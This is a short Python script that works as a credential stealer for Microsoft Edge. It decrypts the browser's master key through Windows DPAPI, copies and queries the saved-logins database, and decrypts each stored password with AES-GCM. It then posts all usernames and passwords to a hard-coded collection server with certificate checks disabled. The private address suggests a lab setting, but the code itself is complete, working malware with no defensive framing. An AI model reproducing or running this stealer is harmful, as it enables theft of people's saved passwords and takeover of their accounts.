import json
import sqlite3
import os
import win32crypt
import base64
import shutil
import requests
from Crypto.Cipher import AES

URL = 'https://192.168.71.129/'

DB_PATH = os.path.expandvars(r"%LOCALAPPDATA%\Microsoft\Edge\User Data\Default\Login Data")
EDGE_KEY_PATH = os.path.expandvars(r"%LOCALAPPDATA%\Microsoft\Edge\User Data\Local State")
TEMP_DB = os.path.expandvars(r"%TMP%\Login Data")
    
if __name__ == "__main__":
    
    # Open Local State file, containing browser configs including encryption key for Login Data
    with open(EDGE_KEY_PATH, 'r') as file:
        json_contents = json.load(file)

    # Retrieve stored Edge key
    encrypted_edge_key = base64.b64decode(json_contents.get("os_crypt").get("encrypted_key"))

    # Remove 'DPAPI' prefix
    encrypted_edge_key = encrypted_edge_key[5:]

    # Decrypt the Edge key via DPAPI
    edge_key = win32crypt.CryptUnprotectData(encrypted_edge_key, None, None, None, 0)
    edge_key = edge_key[1]

    # Copy DB to temp dir
    shutil.copy2(DB_PATH, TEMP_DB)

    # Extract credential records from DB copy
    login_db = sqlite3.connect(f"file:{TEMP_DB}?mode=ro", uri=True)
    cur = login_db.cursor()
    result = login_db.execute("SELECT origin_url, action_url, username_value, password_value FROM logins")
    result = result.fetchall()
    login_db.close()
    os.remove(TEMP_DB)

    # Decrypt each record and send to collection server
    count = 1
    data = {}
    for record in result:
        try:
            username = record[2]
            payload = record[3][3:]         # First 3 bytes are version
            nonce = payload[:12]            # Next 12 bytes are nonce
            ciphertext = payload[12:-16]
            tag = payload[-16:]             # Last 16 bytes are GCM tag
        
            cipher = AES.new(edge_key, AES.MODE_GCM,  nonce)
            password = cipher.decrypt(ciphertext)
            
            data[f'credential#{count}'] = username + '-->' + password.decode('utf-8')
            print(data)
            count = count + 1
        except:
            continue
    requests.post(URL, json=data, verify=False)